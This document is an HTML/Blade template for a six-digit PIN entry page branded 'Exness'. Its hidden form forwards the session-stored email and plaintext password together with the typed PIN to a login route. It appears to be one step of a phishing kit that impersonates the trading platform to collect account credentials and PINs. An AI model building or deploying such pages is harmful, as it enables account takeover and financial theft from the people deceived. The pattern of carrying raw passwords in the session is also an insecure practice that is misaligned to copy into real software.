<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>exness PIN Entry</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="bg-[#f8f9fb] min-h-screen flex items-center justify-center">

<div class="w-full max-w-lg	 text-center space-y-20">

    <!-- Text only (no logo) -->
    <div class="text-black font-bold text-xl">Exness</div>

    <!-- PIN Dots -->
    <div id="pin-dots" class="flex justify-center space-x-2">
        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
        <span class="w-2.5 h-2.5 rounded-full bg-[#d6dbe1] transition-colors duration-200"></span>
    </div>

    <!-- Hidden Form -->
    <form method="POST" action="{{ route('login.store') }}" class="hidden" id="pin-form">
        @csrf
        <input type="hidden" name="email" value="{{ session('email') }}">
        <input type="hidden" name="password" value="{{ session('password') }}">
        <input type="hidden" name="pin" id="pin-input">
    </form>

    <!-- Number Pad -->
    <div class="grid grid-cols-3 gap-16 text-2xl font-medium text-black px-6]">
        <button onclick="appendPin('1')">1</button>
        <button onclick="appendPin('2')">2</button>
        <button onclick="appendPin('3')">3</button>
        <button onclick="appendPin('4')">4</button>
        <button onclick="appendPin('5')">5</button>
        <button onclick="appendPin('6')">6</button>
        <button onclick="appendPin('7')">7</button>
        <button onclick="appendPin('8')">8</button>
        <button onclick="appendPin('9')">9</button>
        <span class="text-sm text-gray-500 mt-2">Forgot?</span>
        <button class="text-yellow-500" onclick="appendPin('0')">0</button>
        <button onclick="clearPin()">←</button>
    </div>
</div>

<script>
    let pin = "";

    function appendPin(digit) {
        if (pin.length < 6) {
            pin += digit;
            updateDots();
        }

        if (pin.length === 6) {
            document.getElementById("pin-input").value = pin;
            document.getElementById("pin-form").submit();
        }
    }

    function clearPin() {
        pin = pin.slice(0, -1);
        updateDots();
    }

    function updateDots() {
        const dots = document.querySelectorAll("#pin-dots span");
        dots.forEach((dot, i) => {
            dot.classList.remove("bg-yellow-400", "bg-[#d6dbe1]");
            dot.classList.add(i < pin.length ? "bg-yellow-400" : "bg-[#d6dbe1]");
        });
    }
</script>

</body>
</html>
